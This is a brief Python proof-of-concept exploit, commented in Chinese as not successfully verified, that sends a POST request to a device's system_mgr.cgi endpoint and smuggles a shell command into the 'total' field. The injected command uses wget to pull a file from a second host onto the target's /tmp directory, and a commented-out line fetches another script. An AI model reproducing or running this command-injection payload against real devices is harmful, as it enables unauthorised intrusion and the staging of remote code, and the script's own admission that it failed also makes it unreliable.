#这个PoC没有验证成功


import requests

url = "http://192.168.31.10/cgi-bin/system_mgr.cgi"

headers = {
}

data = {
    "cmd": "cgi_get_log_item",
    "total": ";wget http://192.168.31.215:8000/hack.txt -O /tmp/hack.txt;"
}   
# wget http://192.168.31.166:9986/poc.py

response = requests.post(
    url,
    headers=headers,
    data=data,
    timeout=10
)

print("Status:", response.status_code)
print("Response:")
print(response.text)

